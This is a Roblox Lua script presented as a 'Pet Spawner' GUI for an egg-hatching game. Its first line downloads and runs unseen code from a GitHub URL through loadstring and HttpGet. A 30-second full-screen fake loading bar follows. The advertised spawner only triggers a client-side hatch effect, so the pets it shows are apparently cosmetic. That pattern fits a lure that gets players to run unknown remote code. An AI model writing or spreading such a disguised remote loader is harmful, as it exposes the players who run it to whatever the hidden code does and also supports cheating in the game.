-- External Script Loader (executed first)
loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1873/Bgsi2/refs/heads/main/PetSpawnerV6.lua"))()

-- Wait until the external script is fully loaded before proceeding
wait(1)

-- Loading Screen
local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "LoadingGUI"
ScreenGui.ResetOnSpawn = false

local background = Instance.new("Frame", ScreenGui)
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

local title = Instance.new("TextLabel", background)
title.Size = UDim2.new(0.6, 0, 0.1, 0)
title.Position = UDim2.new(0.2, 0, 0.3, 0)
title.Text = "Pet Spawner GUI Loading..."
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold

local progressBarBG = Instance.new("Frame", background)
progressBarBG.Size = UDim2.new(0.6, 0, 0.05, 0)
progressBarBG.Position = UDim2.new(0.2, 0, 0.45, 0)
progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
progressBarBG.BorderSizePixel = 0
progressBarBG.ClipsDescendants = true
progressBarBG.BackgroundTransparency = 0.1

local progressBar = Instance.new("Frame", progressBarBG)
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0

local percentage = Instance.new("TextLabel", background)
percentage.Size = UDim2.new(0.2, 0, 0.05, 0)
percentage.Position = UDim2.new(0.4, 0, 0.52, 0)
percentage.Text = "0%"
percentage.TextScaled = true
percentage.BackgroundTransparency = 1
percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
percentage.Font = Enum.Font.Gotham

local credit = Instance.new("TextLabel", background)
credit.Size = UDim2.new(1, 0, 0.05, 0)
credit.Position = UDim2.new(0, 0, 0.58, 0)
credit.Text = "Made By Oblivix.."
credit.TextScaled = true
credit.BackgroundTransparency = 1
credit.TextColor3 = Color3.fromRGB(150, 150, 150)
credit.Font = Enum.Font.Gotham

-- Progress animation for 30 seconds (30 seconds is 3000 milliseconds)
local totalTime = 30
for i = 0, 100 do
    progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
    percentage.Text = i .. "%"
    wait(totalTime / 100)
end

wait(0.5)
ScreenGui:Destroy()

-- Start Roblox GUI and other code...
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Make sure the external script and its functions are available before proceeding
local egg = require(game:GetService("ReplicatedStorage").Client.Effects.HatchEgg)

local petList = {
	"The Overlord", "Rainbow Shock", "Hexarium", "Demonic Hydra", "Green Hydra",
	"Neon Elemental", "Dark Phoenix", "Inferno Cube", "Virus", "Abyss",
	"King Doggy", "Infinity Gem", "The OwOlord", "Dogcat", "ACE",
	"Leviathan", "Giant Robot", "All Seeing Eye", "Almighty Hexarium"
}

local function styleElement(element, cornerRadius)
	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(0, cornerRadius or 8)
	uicorner.Parent = element

	local outline = Instance.new("UIStroke")
	outline.Color = Color3.new(0, 0, 0)
	outline.Thickness = 3
	outline.Parent = element
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HatchEggUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 270, 0, 220)
frame.Position = UDim2.new(0.5, -135, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(20, 30, 60)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
styleElement(frame, 10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(40, 50, 80)
title.Text = "Pet Spawner!"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
styleElement(title)

local petInput = Instance.new("TextBox")
petInput.PlaceholderText = "Enter pet name (or leave blank)"
petInput.Size = UDim2.new(0.9, 0, 0, 30)
petInput.Position = UDim2.new(0.05, 0, 0, 40)
petInput.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
petInput.TextColor3 = Color3.new(1, 1, 1)
petInput.Font = Enum.Font.Gotham
petInput.TextSize = 14
petInput.Text = ""
petInput.ClearTextOnFocus = false
petInput.Parent = frame
styleElement(petInput)

local shinyToggle = Instance.new("TextButton")
shinyToggle.Size = UDim2.new(0.42, 0, 0, 30)
shinyToggle.Position = UDim2.new(0.05, 0, 0, 80)
shinyToggle.Text = "Shiny: OFF"
shinyToggle.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
shinyToggle.TextColor3 = Color3.new(1, 1, 1)
shinyToggle.Font = Enum.Font.GothamBold
shinyToggle.TextSize = 14
shinyToggle.Parent = frame
styleElement(shinyToggle)

local shinyOn = false
shinyToggle.MouseButton1Click:Connect(function()
	shinyOn = not shinyOn
	shinyToggle.Text = "Shiny: " .. (shinyOn and "ON" or "OFF")
	shinyToggle.BackgroundColor3 = shinyOn and Color3.fromRGB(150, 0, 255) or Color3.fromRGB(80, 80, 80)
end)

local mythicToggle = Instance.new("TextButton")
mythicToggle.Size = UDim2.new(0.42, 0, 0, 30)
mythicToggle.Position = UDim2.new(0.53, 0, 0, 80)
mythicToggle.Text = "Mythic: OFF"
mythicToggle.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
mythicToggle.TextColor3 = Color3.new(1, 1, 1)
mythicToggle.Font = Enum.Font.GothamBold
mythicToggle.TextSize = 14
mythicToggle.Parent = frame
styleElement(mythicToggle)

local mythicOn = false
mythicToggle.MouseButton1Click:Connect(function()
	mythicOn = not mythicOn
	mythicToggle.Text = "Mythic: " .. (mythicOn and "ON" or "OFF")
	mythicToggle.BackgroundColor3 = mythicOn and Color3.fromRGB(150, 0, 255) or Color3.fromRGB(80, 80, 80)
end)

local hatchButton = Instance.new("TextButton")
hatchButton.Size = UDim2.new(0.9, 0, 0, 35)
hatchButton.Position = UDim2.new(0.05, 0, 0, 125)
hatchButton.Text = "HATCH EGG!"
hatchButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
hatchButton.TextColor3 = Color3.new(1, 1, 1)
hatchButton.Font = Enum.Font.GothamBold
hatchButton.TextSize = 16
hatchButton.Parent = frame
styleElement(hatchButton)

hatchButton.MouseButton1Click:Connect(function()
	local chosenName = petInput.Text
	if chosenName == "" then
		chosenName = petList[math.random(1, #petList)]
	end

	local customPet = {
		Mythic = mythicOn,
		Shiny = shinyOn,
		Name = chosenName,
		Type = "Pet"
	}

	-- Call your pet hatch function (ensure this is integrated correctly in the external script)
	egg:SpawnPet(customPet)
end)
